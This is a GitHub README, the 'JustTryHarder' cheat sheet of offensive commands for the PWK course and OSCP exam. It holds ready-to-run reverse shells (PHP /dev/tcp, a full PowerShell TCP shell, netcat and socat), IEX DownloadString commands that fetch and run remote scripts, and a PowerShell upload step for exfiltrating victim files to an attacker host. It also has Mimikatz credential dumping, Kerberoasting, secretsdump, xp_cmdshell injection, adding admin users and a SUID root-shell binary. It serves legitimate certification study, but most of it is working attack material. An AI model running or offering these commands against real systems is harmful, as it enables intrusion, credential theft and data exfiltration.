# JustTryHarder

JustTryHarder is a cheat sheet which will aid you through the PWK course & the OSCP Exam.

*(Inspired by PayloadAllTheThings)*

Feel free to submit a Pull Request & leave a star to share some love if this helped you. 💖

**Hacktoberfest friendly!**
Yes, we are open to Pull Requests for Hacktoberfest! Please ensure it is not spam and actually contributes well to this repo. Thanks & happy hacking!

> **Disclaimer:** None of the below includes spoilers for the PWK labs / OSCP Exam.

### Credit Info
I have obtained a lot of this info through other Github repos, blogs, sites and more. I have tried to give as much credit to the original creator as possible. If I have not given you credit, please contact me on Twitter: [https://twitter.com/s1nfulz](https://twitter.com/s1nfulz)

## Table of Contents

- [Determining the OS of a host via Ping](#determining-the-os-of-a-host-via-ping)
- [BOF (WIP)](#bof-wip)
- [Breakouts / Environment Escapes](#breakouts--environment-escapes)
- [DNS - Zone Transfers](#dns---zone-transfers)
- [File Transfers](#file-transfers)
- [Kerberoasting](#kerberoasting)
- [LFI / RFI](#lfi--rfi)
- [MSSQL / SQLi](#mssql--sqli)
- [Password Cracking](#password-cracking)
- [Password Spraying (CrackMapExec)](#password-spraying-crackmapexec)
- [Payload Generation](#payload-generation)
- [PHP](#php)
- [Priv Esc - Linux](#priv-esc---linux)
- [Priv Esc - Windows](#priv-esc---windows)
- [Post Exploitation](#post-exploitation)
- [Port Forwarding](#port-forwarding)
- [Socks Proxy (using PowerShell)](#socks-proxy-using-powershell)
- [Port Scanning](#port-scanning)
- [Ping Sweep](#ping-sweep)
- [Pivoting](#pivoting)
- [Remote Desktop](#remote-desktop)
- [Responder](#responder)
- [Reverse Shells](#reverse-shells)
- [Shell Upgrading](#shell-upgrading)
- [SQL Injection (SQLmap)](#sql-injection-sqlmap)
- [Show listening ports](#show-listening-ports)
- [SMB - Enumeration](#smb---enumeration)
- [SMB - Impacket](#smb---impacket)
- [SMTP Enumeration](#smtp-enumeration)
- [ICMP Injection](#icmp-injection)
- [VMware (not going full screen)](#vmware-not-going-full-screen)
- [Web Servers](#web-servers)
- [Web Scanning](#web-scanning)
- [Web Shells](#web-shells)
- [WordPress](#wordpress)
- [Windows Framework / Powershell](#windows-framework--powershell)
- [Windows Post Exploitation Commands](#windows-post-exploitation-commands)
- [Writeable Directories](#writeable-directories)
- [Todo List](#todo-list)
- [Thank you](#thank-you)

---

## Determining the OS of a host via Ping

```bash
ping 10.10.10.110
PING 10.10.10.110 (10.10.10.110) 56(84) bytes of data.
64 bytes from 10.10.10.110: icmp_seq=1 ttl=128 time=166 ms
````

The `TTL` can be used to determine the OS of the host. The three different types of TTL are as shown below:

  - **TTL=64** = \*nix - The hop count; so if you are getting 61, then there are 3 hops and it is a \*nix device. Most likely Linux.
  - **TTL=128** = Windows - Again, if the TTL is 127 then the hop is 1 and it is a Windows box.
  - **TTL=254** = Solaris/AIX - If the TTL is 250 then the hop count is 4 and it is a Solaris box.

## BOF (WIP)

(Typical bad characters include: `0x00`, `0x0A`, `0x0D`)

  - Fuzzing
  - Finding EIP position
  - Finding bad chars
  - Locating `jmp esp`
  - Generating payload with `msfvenom`
  - Getting reverse shell with `netcat`

**Good BOF resources:**

  - [NCC Group - Writing Exploits for Win32](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/)
  - [Corelan - Exploit Writing Tutorial Part 1](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
  - [GitHub - dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood)
  - [VeteranSec - 32-bit Windows Buffer Overflows Made Easy](https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/)

## Breakouts / Environment Escapes

  - [Pentest Partners - Breaking out of Citrix](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
  - [SRA.io - SiteKiosk Breakout](https://sra.io/blog/sitekiosk-breakout/)
  - [TrustedSec - Kiosk/POS Breakout Keys](https://www.trustedsec.com/blog/kioskpos-breakout-keys-in-windows/)
  - [Cognosec - Breaking out of Citrix Environment](https://cognosec.com/breaking-out-of-citrix-environment/)
  - [NetSPI - Breaking out of Applications](https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/)
  - [NCC Group - Common Issues with Environment Breakouts (PDF)](https://research.nccgroup.com/wp-content/uploads/2020/07/research-insights_common-issues-with-environment-breakouts.pdf)
  - [GracefulSecurity - Citrix Breakout](https://gracefulsecurity.com/citrix-breakout/)

## DNS - Zone Transfers

```bash
host -t axfr HTB.local 10.10.10.10
host -l HTB.local 10.10.10.10
host -l <domain name> <name server>
dig @<dns server> <domain> axfr
```

## File Transfers

### SMB Transfer

On the Victim machine (Windows):

```cmd
net share \\10.10.10.10\myshare
net use x:
copy whatever.zip x:
```

### Wget Transfer

How to retrieve file(s) from host (inside a reverse shell).

**Setup:** Place file you want transferred in `/var/www/html/` and run `service apache2 start`.

Run on the remote server:

```bash
wget [http://10.10.10.10/pspy64](http://10.10.10.10/pspy64)       # <- for single file
wget -r [http://10.10.10.10/pspy64/](http://10.10.10.10/pspy64/)   # <- for folder
```

### TFTP Transfer

(How to transfer from Kali to Windows).

**Using MSF:**
Start MSF before these steps:

1.  `use auxiliary/server/tftp`
2.  `set TFTPROOT /usr/share/mimikatz/Win32/`
3.  `run`

**Inside a terminal:**
4\. `tftp -i 10.10.10.10 GET mimikatz.exe`

### NetCat (Windows to Kali)

1.  **Windows:** `nc -nv 10.11.0.61 4444 < bank-account.zip`
2.  **Linux:** `nc -nlvp 4444 > bank-account.zip`

### PowerShell

Interactive session:

```powershell
Invoke-WebRequest -Uri [http://127.0.0.1/exploit.py](http://127.0.0.1/exploit.py) -OutFile C:\Users\Victim\exploit.py
```

Without an interactive PowerShell session (Create `wget.ps1`):

```powershell
$client = New-Object System.Net.WebClient
$path = "C:\path\to\save\file.txt"
$client.DownloadFile($url, $path)
```

### Base64 (Linux -\> Linux)

**Local Host:**

1.  `$(echo "cat /path/to/exploit.py | base64") > encoded.b64`
2.  Transfer `encoded.b64` to the remote server via `nc` or otherwise.

**Remote Server - Linux:**
3\. `cat /path/to/encoded.b64 | base64 -d > exploit.py`

### Certutil

```cmd
certutil.exe -urlcache -split -f "[http://ip.for.kali.box/file-to-get.zip](http://ip.for.kali.box/file-to-get.zip)" name-to-save-as.zip
```

### HTTP File Upload (Exfiltration)

**1. Create upload.php**
Create in attacking machine webroot (`/var/www/html` by default).

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

**2. Create directory**
Create upload directory and set appropriate permissions to allow upload.

```bash
sudo mkdir /var/www/uploads && sudo chown www-data:www-data /var/www/uploads
```

**3. Upload file**
Upload file from victim machine to attacking machine using PowerShell:

```powershell
powershell.exe -exec unrestricted -noprofile -Command "(New-Object System.Net.WebClient).UploadFile('[http://10.10.10.10/upload.php](http://10.10.10.10/upload.php)', 'file-to-upload.txt')"
```

## Kerberoasting

  - `GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>`
  - `powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat`
  - `impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER> -outputfile filename.hashes`

## LFI / RFI

**PHP Reverse Shell:**

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10/1234 0>&1'"); ?>
```

**Command Injection:**

```php
<?php echo shell_exec(whoami);?>
```

## MSSQL / SQLi

  - `EXEC master..xp_cmdshell 'whoami';`
  - `' exec master..xp_cmdshell 'whoami' --`
  - [OSCP-2 SQL Injection Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)
  - [PentestMonkey SQL Injection](http://pentestmonkey.net/category/cheat-sheet/sql-injection)

## Password Cracking

**Hashcat**

```bash
hashcat -m 500 -a 0 -o cracked_password.txt --force hash.txt /path/to/your/wordlist.txt
```

**John The Ripper**

```bash
john --rules --wordlist=/path/to/your/wordlist.txt hash.txt
```

## Password Spraying (CrackMapExec)

```bash
cme smb 10.10.10.10 -u username -d domain -p password
```

## Payload Generation

  - [NETSEC - Creating Payloads](https://netsec.ws/?p=331)
  - [MsfVenom Cheatsheet](https://www.google.com/search?q=http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/_)
  - [Metasploit Unleashed Payloads](https://www.offensive-security.com/metasploit-unleashed/payloads/)
  - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

**Types:**

  - Non-staged: `netcat`
  - Staged: `multi/handler`

## PHP

  - [The differences between exec(), shell\_exec, system() and passthru()](https://stackoverflow.com/questions/20072696/what-is-different-between-exec-shell-exec-system-and-passthru-functions?lq=1)

## Priv Esc - Linux

**Note:** If GCC & wget are installed, the system MIGHT be vulnerable to a kernel exploit.

  - [Linux Kernel Exploits](https://github.com/SecWiki/linux-kernel-exploits)
  - [GTFObins - Break out of restricted shells](https://gtfobins.github.io)
      - GTFO Helper script: [https://github.com/dreadnaughtsec/gtfo](https://github.com/dreadnaughtsec/gtfo)
  - [Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
  - [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
  - [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

**Enumeration Commands:**

```bash
grep -Ri 'password' .
find / -perm –4000 2>/dev/null
find / -perm -u=s 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
# (then ls -la, look for 777 file permissions)
```

**Custom SUID binary:**
Requires code execution as the target user. Example: mysql sys\_eval as root.

```c
#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>

int main(){
    setuid(geteuid());
    system("/bin/bash");
    return 0;
}
```

## Priv Esc - Windows

  - [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
  - [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
  - [PowerUp / PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
  - [Powerless - Enumeration Tool](https://github.com/M4ximuss/Powerless)
  - [Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
  - [Just Another Windows (Enum) Script / JAWS](https://github.com/411Hall/JAWS)
  - [Watson](https://github.com/rasta-mouse/Watson)
  - [Sherlock (Deprecated)](https://github.com/rasta-mouse/Sherlock)
  - [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

**Commands:**

  - `churrasco -d "net user /add <username> <password>"`
  - `churrasco -d "net localgroup administrators <username> /add"`
  - `churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"`

## Post Exploitation

1.  `Mimikatz.exe` (run it)
2.  `privilege::debug`
3.  `sekurlsa::logonpasswords`

## Port Forwarding

> **Local:** Forward local port to remote host.
> Use local if you have a service running on a machine that can be reached from the remote machine, and you want to access it directly from the local machine.
>
> **Remote:** Forward remote port to local host.
> Use remote if you have a service that can be reached from the local machine, and you need to make it available to the remote machine. It opens the listening socket on the machine you have used SSH to log into.
>
> **Dynamic:** Use SOCKS.
> Dynamic is like local, but on the client side it behaves like a SOCKS proxy. Use it if you need to connect with a software that expects SOCKS forwarding.

### Chisel

**Local system:**

```bash
./chisel server -p 8080 --reverse
```

**Victim:**

```bash
./chisel client YOUR_IP:8080 R:1234:127.0.0.1:1234
```

### SSH

1.  **Generate an SSH key pair** on the box being pivoted through to protect your credentials.

<!-- end list -->

```bash
ssh-keygen
cat ~/.ssh/id_rsa.pub
```

2.  **Copy the public key**. Add this value and the pivot machine's IP address to the `~/.ssh/authorized_keys` file on your attacking (Kali) machine using the syntax below.

<!-- end list -->

```
from="[VICTIM_MACHINE_IP_ADDRESS]",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty [PUBLIC_KEY_VALUE]
```

3.  **Ensure the SSH service is running** on your attacking (Kali) machine.

<!-- end list -->

```bash
sudo service ssh start
```

4.  **Initiate SSH call** from the box being pivoted through and specify the `id_rsa` private key generated in step 1.

<!-- end list -->

```bash
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /[PATH_TO_YOUR_PRIVATE_KEY]/id_rsa kali@[ATTACKING_MACHINE_IP]
```

5.  **Edit your proxychains config**: `/etc/proxychains.conf`

<!-- end list -->

```
socks4 127.0.0.1 1080
```

6.  **Run proxychains**. When scanning with `nmap`, be sure to use TCP Connect scans.

<!-- end list -->

```bash
sudo proxychains nmap -sT -p80 -sC -sV --open -Pn -n 10.10.10.10
```

**Additional Notes:**

  - `ssh user@10.10.10.10 -R 1234:127.0.0.1:1234`
  - `ssh -D 1337 -q -C -N -f user@10.10.10.10` ([Source](https://ma.ttias.be/socks-proxy-linux-ssh-bypass-content-filters))

## Socks Proxy (using PowerShell)

**Local:**

  - `vi /etc/proxychains.conf` -\> `socks5 <ip> 9080`
  - `Import-Module .\Invoke-SocksProxy.psm1`
  - `Invoke-SocksProxy -bindPort 9080`
  - `proxychains nmap -sT <ip>`

## Port Scanning

### TCP

```bash
reconnoitre -t 10.10.10.10 -o . --services --quick --hostnames
nmap -vvv -sC -sV -p- --min-rate 2000 10.10.10.10
nmap -sT -p 22,80,110 -A
nmap -p- -iL ips.txt > TCP_Ports.txt
nc -v -n -z -w1 10.10.10.10 1-10000
nmap -p- -iL ips.txt > AllTCPPorts.txt
```

### UDP

(Can take hours, `netstat` is a better alternative if you have shell).

```bash
nmap -sU --top-ports 10000
nmap -sT -sU -p 22,80,110 -A
nmap -sT -sU -p- --min-rate 2000
nmap -p- -sU -iL ips.txt > udp.txt
nmap -sU -sV -iL ips.txt > alludpports.txt
```

### Other Protocols

**SNMP:**
`nmap -p161 -sU -iL ips.txt > udp.txt`

**SSH:**
`nmap --script ssh2-enum-algos -iL ips.txt > SSH.txt`

**SSL:**
`nmap -v -v --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,sslv2 -iL ips.txt > SSLScan.txt`

**NMAP Bootstrap Report:**

```bash
nmap -oA poison --stylesheet nmap-bootstrap.xsl 10.10.10.10
firefox nmap-bootstrap.xsl
```

## Ping Sweep

### Linux (One-liners)

```bash
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
fping -g 192.168.0.1/24
```

### Linux (Script)

```bash
for i in `seq 1 255`
do
    ping -c1 192.168.125.$i 2>/dev/null 1>&2
    if [[ $? -eq 0 ]]
    then
        echo 192.168.125.$i is up
    fi
done
```

### Windows (CMD)

```cmd
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
```

### Windows (PowerShell)

```powershell
$ping = New-Object System.Net.Networkinformation.Ping ; 1..254 | % { $ping.send("10.9.15.$_", 1) | where status -ne 'TimedOut' | select Address | fl * }
```

### Nmap

```bash
nmap -sP 192.168.0.1-254
```

## Pivoting

  - `sshuttle -r user@10.10.10.10 10.1.1.0/24`

## Remote Desktop

  - `rdesktop -u user -p password 10.10.10.10 -g 85% -r disk:share=/root/`
  - `xfreerdp /d:xyz.local /u:username /p:password /v:10.10.10.10 /cert-ignore`

## Responder

  - `responder -I tun0 -wrF`
  - [Responder with NTLM Relay and Empire](https://chryzsh.gitbooks.io/darthsidious/content/execution/responder-with-ntlm-relay-and-empire.html)
  - [Practical Guide to NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

## Reverse Shells

**Linux:**

  - [PentestMonkey - Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
  - [Awansec - Reverse Shell](https://awansec.com/reverse-shell.html)
  - [RevShells.com](https://www.revshells.com/)

**Windows:**

  - [GitHub - Windows PHP Reverse Shell](https://github.com/Dhayalanb/windows-php-reverse-shell)
  - `nc 10.10.10.10 4444 –e cmd.exe`

## Shell Upgrading

Source: [Ropnop Blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) & [HTB Forum](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)

### Python

1.  `python -c 'import pty;spawn("/bin/bash");'` OR `python3 -c 'import pty;spawn("/bin/bash");'`
2.  In reverse shell:

<!-- end list -->

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
```

3.  In Kali:

<!-- end list -->

```bash
stty raw -echo
fg
```

4.  In reverse shell:

<!-- end list -->

```bash
reset # (sometimes optional)
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols> # (optional)
```

### Using Socat

**Listener:**

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**Victim:**

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

### Perl

1.  `perl -e 'exec "/bin/sh";'`
2.  `perl: exec "/bin/sh";`

### Bash

`/bin/sh -i`

## SQL Injection (SQLmap)

```bash
sqlmap -u "[http://example.com/test.php?test=test](http://example.com/test.php?test=test)" --level=5 --risk=3 --batch
```

## Show listening ports

**Linux netstat:**
`netstat -tulpn | grep LISTEN`

**FreeBSD/MacOS X netstat:**
`netstat -anp tcp | grep LISTEN`
`netstat -anp udp | grep LISTEN`

**OpenBSD netstat:**
`netstat -na -f inet | grep LISTEN`
`netstat -nat | grep LISTEN`

**Nmap scan:**
`sudo nmap -sT -O localhost`
`sudo nmap -sU -O 192.168.2.13` (UDP)
`sudo nmap -sT -O 192.168.2.13` (TCP)

## SMB - Enumeration

  - [0xdf - SMB Enumeration Checklist](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)
  - `smbmap -H 10.10.10.10`
  - `smbclient -L 10.0.0.10`
  - `smbclient //10.10.10.10/share$`

## SMB - Impacket

**Impacket's PSEXEC** (After creating a remote port fwd):

```bash
/usr/share/doc/python-impacket/examples/psexec.py user@10.10.10.10
# Password: (password)
# [*] Trying protocol 445/SMB...
```

**Impacket's SMBServer** (For File Transfer):

1.  `cd /usr/share/windows-binaries`
2.  `python /usr/share/doc/python-impacket/examples/smbserver.py a .`
3.  `\\10.10.10.10\a\mimikatz.exe`

## SMTP Enumeration

  - [SMTP Commands](https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/SMTP/smtp_commands.txt)

## ICMP Injection

1.  `ping -n 3 10.10.10.10`
2.  `tcpdump -i tun0 icmp`

## VMware (not going full screen)

`systemctl restart open-vm-tools.service`

## Web Servers

  - `python -m SimpleHTTPServer 80`
  - `python3 -m http.server 80`
  - `ngrok http "file:///C:\Users\sinfulz\Public Folder"`
  - `php -S 0.0.0.0:80`

## Web Scanning

**GoBuster (Linux/Apache):**

```bash
gobuster dir -e -u [http://10.10.10.10/](http://10.10.10.10/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,jsp,pl -s 200,204,301,302,307,403,401
```

**GoBuster (Windows/IIS):**

```bash
gobuster dir -e -u [http://10.10.10.10/](http://10.10.10.10/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,asp,aspx,jsp,bak -s 200,204,301,302,307,403,401
```

**Dirsearch (Linux/Apache):**

```bash
python3 dirsearch.py -r -u [http://10.10.10.131/](http://10.10.10.131/) -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,jsp,pl -t 50
```

**Dirsearch (Windows/IIS):**

```bash
python3 dirsearch.py -r -u [http://10.10.10.131/](http://10.10.10.131/) -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,asp,aspx,jsp,bak -t 50
```

**Other GoBuster:**

  - HTTP: `gobuster dir -u http://10.10.10.10 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -t 69`
  - HTTPS: `gobuster dir -k -u https://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69`

**Nikto:**

  - HTTP: `nikto -h 10.10.10.10 -p 80`
  - HTTPS: `nikto -h 10.10.10.10 -p 443`

**WFuzz:**

```bash
wfuzz -u [http://10.10.10.10/hello.php?dir=../../../../../../../../../FUZZ%00](http://10.10.10.10/hello.php?dir=../../../../../../../../../FUZZ%00) -w /usr/share/wfuzz/wordlist/general/common.txt
```

## Web Shells

  - [PHPBash](https://github.com/Arrexel/phpbash)
  - [p0wny-shell](https://github.com/flozz/p0wny-shell)

## WordPress

  - [Top Hat Sec - WP](https://forum.top-hat-sec.com/index.php?topic=5758.0)

## Windows Framework / Powershell

**Bypass PowerShell execution policy:**

```powershell
powershell -ExecutionPolicy ByPass -File script.ps1
```

**Resources:**

  - [Nishang](https://github.com/samratashok/nishang)
  - [Sherlock](https://github.com/rasta-mouse/Sherlock)

**Reverse PowerShell:**
(Sometimes powershell or echo may need to be in front of the string, or quotes used).

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**PowerUp (from local web server):**

```powershell
echo IEX(New-Object Net.WebClient).DownloadString('[http://10.10.10.10:80/PowerUp.ps1](http://10.10.10.10:80/PowerUp.ps1)') | powershell -noprofile -
```

or

```powershell
powershell -nop -exec bypass IEX "(New-Object Net.WebClient).DownloadString('[http://10.10.14.](http://10.10.14.)x/Whatever.ps1'); Invoke-Whatever"
```

**Reverse PowerShell using MSSQL:**

```sql
xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\"[http://10.10.10.10/Nishang-ReverseShell.ps1](http://10.10.10.10/Nishang-ReverseShell.ps1)\")
```

**File transfer with PowerShell:**

```powershell
powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://server/path/to/file', 'nameforefile')
```

## Windows Post Exploitation Commands

```cmd
WMIC USERACCOUNT LIST BRIEF
net user
net localgroup Users
net localgroup Administrators
net user USERNAME NEWPASS /add
net user "USER NAME" NEWPASS /add
net localgroup administrators USERNAME /add
```

## Writeable Directories

### Windows

(Source: [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md))
The following folders are by default writable by normal users (varies by OS version).

```
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

### Linux

To find World Writeable Directories in Linux:

```bash
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
```

-----

## Todo List:

  - [ ] Improve the readability of the cheatsheet
  - [ ] Fill in the empty sections
  - [ ] Remove unnecessary sections
  - [ ] Integrate the files in the repo into the cheatsheet
  - [ ] Migrate to GitBook
  - [ ] Include screenshots/gifs into the cheatsheet if needed
  - [ ] Add a Table of Contents

## Thank you:

Thanks to these people for including my cheatsheet on their website/blog:

- [KhaoticDev Cheatsheets](https://khaoticdev.net/cheatsheets/#collections)
- [NCyberSec Facebook Post](https://www.facebook.com/ncybersec/posts/1541830509321001)
- [CyberG0100 Facebook Post](https://www.facebook.com/cyberg0100/posts/github-sinfulzjusttryharder-justtryharder-a-cheat-sheet-which-will-aid-you-throu/653235345249466)
- [r/CyberSpaceVN Reddit Post](https://www.reddit.com/r/CyberSpaceVN/comments/f3n2wp/github_sinfulzjusttryharder_justtryharder_a_cheat)
- [XN4K PWK Cheatsheet](https://xn4k.github.io/pentest/PWK-course-&-the-OSCP-Exam-Cheatsheet/)
- [OpenSourceLibs Pentesting Tools](https://opensourcelibs.com/libs/pentesting-tools)
- [GitMemory (brhannah)](https://gitmemory.com/brhannah)
- [BugBountyTips Blog](https://www.bugbountytips.tech/2020/08/23/justtryharderpwk-cheatsheetkali-linux-cheatsheethydra-cheatsheetsecu-2/)
- [PythonLang OSCP Category](https://pythonlang.dev/category/oscp/)
